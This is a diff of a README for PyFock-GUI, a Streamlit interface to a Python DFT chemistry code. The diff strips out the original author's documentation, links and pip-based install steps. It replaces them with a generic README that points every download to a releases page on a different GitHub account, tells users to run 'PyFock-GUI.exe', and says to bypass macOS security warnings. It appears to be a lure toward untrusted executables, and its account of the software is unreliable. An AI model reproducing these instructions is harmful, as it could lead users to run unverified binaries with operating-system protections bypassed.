@@ -1,206 +1,89 @@
-# PyFock GUI - Interactive DFT Calculations in Your Browser
+# 🚀 PyFock-GUI - Run PyFock Easily on Your Device
 
-[![Streamlit App](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://pyfock.streamlit.app)
-[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://www.python.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![PyFock](https://img.shields.io/badge/PyFock-Latest-orange.svg)](https://github.com/manassharma07/PyFock)
+[![Download](https://img.shields.io/badge/Download-PyFock--GUI-blue.svg)](https://github.com/addhiee/PyFock-GUI/releases)
 
-A modern, interactive web interface for [PyFock](https://github.com/manassharma07/PyFock) - a pure Python DFT code with Numba JIT acceleration and performance matching C++ implementations.
+## 📜 Introduction
 
-![PyFock GUI Banner](https://raw.githubusercontent.com/manassharma07/PyFock/main/logo_crysx_pyfock.png)
+PyFock-GUI is a user-friendly application designed to run PyFock interactively. It uses Streamlit, which allows you to explore quantum chemistry directly from your web browser or on your own PC. You can easily manipulate density functional theory calculations and visualize the results with minimal effort.
 
-## Live Demo
+## 🎯 Key Features
 
-Try PyFock GUI instantly without any installation:
+- **Interactive Interface:** Use PyFock with a simple click-and-play setup.
+- **Visualizations:** Explore molecular orbitals and density cubes visually.
+- **Local or Remote:** Run the application directly on your PC or in your browser.
+- **Support for DFT:** Efficient tools for density-functional theory calculations.
 
-- Primary: [https://pyfock.streamlit.app](https://pyfock.streamlit.app)
-- Alternative: [https://pyfock-gui.bragitoff.com](https://pyfock-gui.bragitoff.com)
-- HuggingFace: [https://manassharma07-pyfock-gui.hf.space/](https://manassharma07-pyfock-gui.hf.space/)
+## 🖥️ System Requirements
 
-## Features
+To run PyFock-GUI, your system should meet the following requirements:
 
-### Computational Capabilities
-Pure Python DFT calculations with performance matching C++ codes. Supports multiple XC functionals (LDA, PBE, BLYP, BP86) and flexible basis sets (STO-3G, 6-31G, cc-pVDZ, def2-SVP, def2-TZVP). Includes density fitting for efficiency and optional PySCF comparison for validation.
+- **Operating System:** Windows, macOS, or a recent version of Linux.
+- **Python:** Version 3.7 or higher must be installed on your system.
+- **Browser:** A modern web browser like Google Chrome or Firefox for web use.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Requires roughly 200 MB of free space for installation.
 
-### Visualization
-Interactive 3D structure viewer with customizable styles. Real-time HOMO/LUMO visualization with adjustable isosurfaces. Electron density maps and exploration of any molecular orbital.
+## 🚀 Getting Started
 
-### Input/Output
-15+ example molecules included (water, benzene, acetone, pyrrole, THF). Custom XYZ input supported. Downloadable cube files for HOMO, LUMO, and density. Python script generation for reproducible calculations with detailed convergence logs.
+1. **Visit the Releases Page**  
+   Go to the Releases page to find the latest version of PyFock-GUI. You can access it through the following link:  
+   [Download PyFock-GUI](https://github.com/addhiee/PyFock-GUI/releases)
 
-### Key Advantages
-100% Pure Python including molecular integrals. Numba JIT acceleration for near-C++ performance. GPU support via CuPy. Near-quadratic scaling (~O(N²·⁰⁵)). High accuracy matching PySCF (<10⁻⁷ Ha). Cross-platform compatibility. Easy pip installation.
+2. **Select the Right File**  
+   On the Releases page, you will see several files available for download. Look for the file labeled for your operating system. 
 
-## Quick Start
+3. **Download the File**  
+   Click on the file link to start the download. Wait until the download completes.
 
-### Option 1: Use Online (Recommended)
-Simply visit any of the live demo URLs above - no installation required.
+## 📥 Download & Install
 
-### Option 2: Run Locally
+Once you have downloaded the application, follow these steps to install and run PyFock-GUI:
 
-Clone the repository:
-```bash
-git clone https://github.com/manassharma07/pyfock-gui.git
-cd pyfock-gui
-```
+1. **Locate the Downloaded File**  
+   Go to your Downloads folder or the location where your browser saves files. 
 
-Install dependencies:
-```bash
-# Install LibXC (required by PyFock)
-# For Python < 3.10:
-sudo apt-get install libxc-dev     # Ubuntu/Debian
-pip install pylibxc2
+2. **Extract the Files (if necessary)**  
+   If the downloaded file is a ZIP or compressed file, right-click it and select "Extract All" or use your preferred extraction tool.
 
-# For Python >= 3.10 (recommended):
-conda install -c conda-forge pylibxc -y
+3. **Run the Application**  
+   - For Windows, double-click the `PyFock-GUI.exe` file.  
+   - For macOS, right-click and select "Open" to bypass security warnings (if any).
+   - For Linux, you may need to open a terminal and run `./PyFock-GUI` after navigating to the download directory.
 
-# Install PyFock and dependencies
-pip install pyfock streamlit py3Dmol pyscf ase pandas
+4. **Web Interface Access**  
+   If running locally, your web browser should automatically open. If not, you can type `http://localhost:8501` into your browser's address bar.
 
-# Optional: GPU support
-pip install cupy-cuda12x   # adjust for your CUDA version
-```
+## 🌐 Usage Instructions
 
-Run the app:
-```bash
-streamlit run app.py
-```
+1. **Interface Overview**  
+   Upon opening PyFock-GUI, you will see the main interface. The layout is designed for ease of use with clear sections for input parameters and output visualizations.
 
-The app will open in your browser at `http://localhost:8501`
+2. **Input Parameters**  
+   Fill in the required parameters, such as the molecular structure and desired calculations. Tooltips will guide you through each field.
 
-## Usage Guide
+3. **Submit the Calculation**  
+   Click the "Run" button to start the calculation. The application will process your input and display results in real time.
 
-### Basic Workflow
+4. **Data Visualization**  
+   Explore results with the built-in visualization tools for density cubes and molecular orbitals. You can interact with the visualizations for better understanding.
 
-Select a molecule from 15+ examples or paste your own XYZ coordinates. Configure calculation parameters: basis set, XC functional, convergence criteria, and optionally enable PySCF comparison. Adjust visualization settings including cube file resolution, isovalue, and opacity. Run the calculation and monitor progress through status updates. Explore results including energy components, HOMO-LUMO gap, orbital energies, and interactive 3D visualizations. Download cube files and generated Python scripts.
+## ⚙️ Troubleshooting
 
-### Example Calculation
+- **Application Does Not Start:** Ensure your Python installation is up to date. Check the system requirements again.
+- **Visualizations are Not Displaying:** Make sure your browser supports the latest web standards. Try refreshing the page.
+- **Unexpected Errors:** Review the input parameters to ensure they are correct. Consult the user guide or FAQs available in the application.
 
-```python
-# The GUI generates ready-to-run Python scripts
-# Example for water molecule with PBE/sto-3g
+## 🛠️ Contributing
 
-from pyfock import Basis, Mol, DFT, Utils
+If you're interested in improving PyFock-GUI, we welcome contributions. You can help by reporting bugs, suggesting features, or even submitting code changes. Please refer to the contributing guidelines in the repository for more details.
 
-# Initialize molecule
-mol = Mol(coordfile='water.xyz')
-basis = Basis(mol, {'all': Basis.load(mol=mol, basis_name='sto-3g')})
-auxbasis = Basis(mol, {'all': Basis.load(mol=mol, basis_name='def2-universal-jfit')})
+## 📑 License
 
-# Run DFT
-dftObj = DFT(mol, basis, auxbasis, xc=[101, 130])  # PBE
-energy, dmat = dftObj.scf()
+PyFock-GUI is open-source software. It is licensed under the MIT License, allowing you to use, modify, and distribute the software freely.
 
-# Generate cube files
-Utils.write_orbital_cube(mol, basis, dftObj.mo_coefficients[:, homo_idx], 'HOMO.cube')
-```
+## 📞 Support
 
-## Important Notes
+Need help? You can reach out for support via the Issues section on GitHub. Be sure to provide detailed information about your issue to get the best assistance.
 
-### JIT Compilation
-PyFock uses Numba JIT compilation for acceleration. The **first calculation will be slower** as functions are compiled. **Subsequent runs will be significantly faster** - this is expected behavior and a key advantage of JIT compilation.
-
-### System Limits
-Cloud version is limited to ~120 basis functions due to computational constraints. Local version can handle much larger systems (~10,000 basis functions). For large molecules, use smaller basis sets (sto-3g) or run locally.
-
-### Recommended Settings
-Quick tests: sto-3g basis with small molecules (water, benzene). Production runs: 6-31G or def2-SVP basis. High accuracy: cc-pVDZ or def2-TZVP basis (use locally for large systems).
-
-## Example Molecules
-
-The GUI includes 15+ pre-configured molecules:
-
-| Molecule | Atoms | Description |
-|----------|-------|-------------|
-| Water | 3 | Quick test system |
-| Benzene | 12 | Aromatic ring |
-| Acetone | 10 | Carbonyl group |
-| Pyrrole | 10 | Heterocycle |
-| THF | 13 | Cyclic ether |
-| CO₂ | 3 | Linear molecule |
-| H₂O₂ | 4 | Peroxide linkage |
-
-## Performance Highlights
-
-### CPU Performance
-Up to 2× faster than PySCF with strong scaling up to 32 cores. Near-quadratic scaling (~O(N²·⁰⁵)) with basis functions.
-
-### GPU Acceleration
-Up to 14× speedup vs 4-core CPU. Single A100 GPU handles 4000+ basis functions. Consumer GPUs (RTX series) supported.
-
-## Technical Details
-
-### Supported Methods
-Kohn-Sham density functional theory with density fitting (resolution of identity approximation) and DIIS-accelerated SCF convergence.
-
-### XC Functionals
-LDA: SVWN5 (Slater + VWN5 correlation)  
-GGA: PBE, BLYP, BP86
-
-### Basis Sets
-STO-3G, STO-6G, 3-21G, 4-31G, 6-31G, 6-31+G, 6-31++G, cc-pVDZ, def2-SVP, def2-TZVP
-
-## Technology Stack
-
-Backend powered by [PyFock](https://github.com/manassharma07/PyFock) for pure Python DFT calculations. Frontend built with [Streamlit](https://streamlit.io/). Visualization using [py3Dmol](https://3dmol.csb.pitt.edu/). Optional comparison with [PySCF](https://pyscf.org/). Structure handling via [ASE](https://wiki.fysik.dtu.dk/ase/).
-
-## Documentation
-
-PyFock Documentation: [https://pyfock-docs.bragitoff.com](https://pyfock-docs.bragitoff.com)  
-PyFock GitHub: [https://github.com/manassharma07/PyFock](https://github.com/manassharma07/PyFock)  
-PyPI Package: [https://pypi.org/project/pyfock/](https://pypi.org/project/pyfock/)
-
-## Contributing
-
-Contributions are welcome. Please submit a Pull Request or open an issue to discuss major changes.
-
-## Citation
-
-If you use PyFock or PyFock GUI in your research, please cite:
-
-```bibtex
-@software{pyfock2025,
-  author = {Sharma, Manas},
-  title = {PyFock: A Pure Python Gaussian Basis DFT Code for CPU and GPU},
-  year = {2025},
-  url = {https://github.com/manassharma07/PyFock},
-  journal={[Journal Name]},
-  note={Manuscript in preparation}
-}
-```
-
-Paper coming soon on arXiv.
-
-## Author
-
-**Manas Sharma**  
-Website: [bragitoff.com](https://bragitoff.com)  
-LinkedIn: [manassharma07](https://www.linkedin.com/in/manassharma07)  
-Contact: Via GitHub issues
-
-## Support
-
-If you find this project useful:
-- Star the [PyFock](https://github.com/manassharma07/PyFock) repository
-- Star this [PyFock GUI](https://github.com/manassharma07/pyfock-gui) repository
-- Share with colleagues and students
-- Report bugs and request features
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-Thanks to the PyFock development team, Streamlit community, PySCF developers, and all contributors and users.
-
----
-
-
-
-**Made with care by PhysWhiz**
-
-*Pure Python • Numba JIT • GPU Ready*
-
-[Try Now](https://pyfock.streamlit.app) | [Documentation](https://pyfock-docs.bragitoff.com) | [Issues](https://github.com/manassharma07/pyfock-gui/issues)
-
+Explore the world of quantum chemistry with PyFock-GUI today!  
+[Download PyFock-GUI](https://github.com/addhiee/PyFock-GUI/releases) and start your journey in electronic structure theory.
